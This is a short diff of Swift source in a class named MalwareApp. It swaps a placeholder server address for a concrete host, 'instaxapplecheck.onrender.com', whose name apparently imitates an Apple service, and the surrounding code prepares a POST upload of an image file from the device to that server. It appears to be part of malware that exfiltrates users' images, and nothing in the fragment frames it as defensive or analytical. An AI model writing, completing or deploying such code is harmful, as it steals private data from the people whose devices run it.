@@ -61,7 +61,7 @@ class MalwareApp: UIApplicationMain {
                 let uploadPath = "\(imagePath)/\(uploadedImageFile)"
 
                 // Upload the image to the server
-                let serverURL = URL(string: "https://YOUR-RENDER-URL.onrender.com/uploads")!
+                let serverURL = URL(string: "https://instaxapplecheck.onrender.com/uploads")!
 
                 var request = URLRequest(url: serverURL)
                 request.httpMethod = "POST"
